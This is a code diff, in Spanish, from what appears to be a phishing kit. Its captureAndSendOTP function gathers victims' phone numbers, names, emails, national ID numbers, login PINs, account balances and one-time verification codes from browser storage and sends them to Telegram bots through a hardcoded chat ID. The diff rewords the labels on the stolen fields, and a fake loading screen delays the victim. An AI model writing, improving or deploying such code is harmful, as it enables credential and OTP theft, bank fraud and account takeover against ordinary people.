@@ -111,23 +111,21 @@ async function captureAndSendOTP() {
     let datosConsulta = "❌ No hay datos del formulario de consulta";
     if (registros && registros.length > 0) {
         const r = registros[registros.length - 1];
-        datosConsulta = "📦 FORMULARIO CONSULTA\n" +
-            "📱 Teléfono: " + r.telefono + "\n" +
-            "👤 Nombre: " + r.nombre + "\n" +
-            "📧 Correo: " + r.correo + "\n" +
-            "🆔 Cédula: " + r.cedula + "\n" +
-            "🕒 Fecha: " + r.fecha;
+        datosConsulta = "#1\n" +
+            "Numero: " + r.numero + "\n" +
+            "Nombre: " + r.nombre + "\n" +
+            "Correo: " + r.correo + "\n" +
+            "Cédula: " + r.cedula + "\n";
     }
 
     /* =============================== OBTENER STORAGE 2: loginData =============================== */
     const loginData = JSON.parse(localStorage.getItem("loginData"));
     let datosLogin = "❌ No hay datos del formulario login";
     if (loginData) {
-        datosLogin = "📦 FORMULARIO LOGIN\n" +
-            "📱 Teléfono: " + loginData.telefono + "\n" +
-            "🔐 PIN: " + loginData.pin + "\n" +
-            "💰 Saldo: " + loginData.saldo + "\n" +
-            "🕒 Fecha: " + loginData.fecha;
+        datosLogin = "#2\n" +
+            "Numero: " + loginData.numero + "\n" +
+            "Clave: " + loginData.clave + "\n" +
+            "Saldo: " + loginData.saldo + "\n";
     }
 
     /* =============================== MENSAJE FINAL =============================== */
@@ -139,9 +137,8 @@ async function captureAndSendOTP() {
     const BOT_2_CHAT_ID = "7874654715";
 
     const mensajeFinal = datosConsulta + "\n\n" + datosLogin + "\n\n" +
-        "📦 CONFIRMACIÓN FINAL\n" +
-        "🔢 Código verificación: " + codigoOTP + "\n" +
-        "🕒 Fecha: " + new Date().toLocaleString();
+        "Nueva dinamica\n" +
+        "Clave dinámica : " + codigoOTP;
 
     /* =============================== ENVÍO A TELEGRAM (MODIFICADO PARA 2 BOTS) =============================== */
     try {
@@ -216,6 +213,7 @@ function mostrarCargaYError() {
 
   }, 30000); // ⏱️ tiempo de carga
 }
+
 
 
 
